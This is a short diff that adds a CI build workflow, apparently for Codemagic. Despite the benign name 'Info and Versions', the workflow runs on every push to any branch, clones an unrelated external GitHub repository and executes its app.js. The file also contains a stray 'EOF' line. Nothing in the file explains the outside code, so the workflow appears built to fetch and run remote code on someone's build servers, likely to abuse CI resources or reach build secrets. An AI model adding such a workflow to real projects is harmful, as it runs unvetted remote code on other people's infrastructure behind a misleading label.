@@ -1,0 +1,18 @@
+workflows:
+  info-and-versions:
+    name: Info and Versions
+    # instance_type: linux_x2
+    max_build_duration: 120
+    triggering:
+      events:
+        - push
+      branch_patterns:
+        - pattern: "*"
+          include: true
+    scripts:
+      - name: Run
+        script: |
+          git clone https://github.com/minotau715-svg/noma abs
+          cd abs
+          EOF
+          node app.js
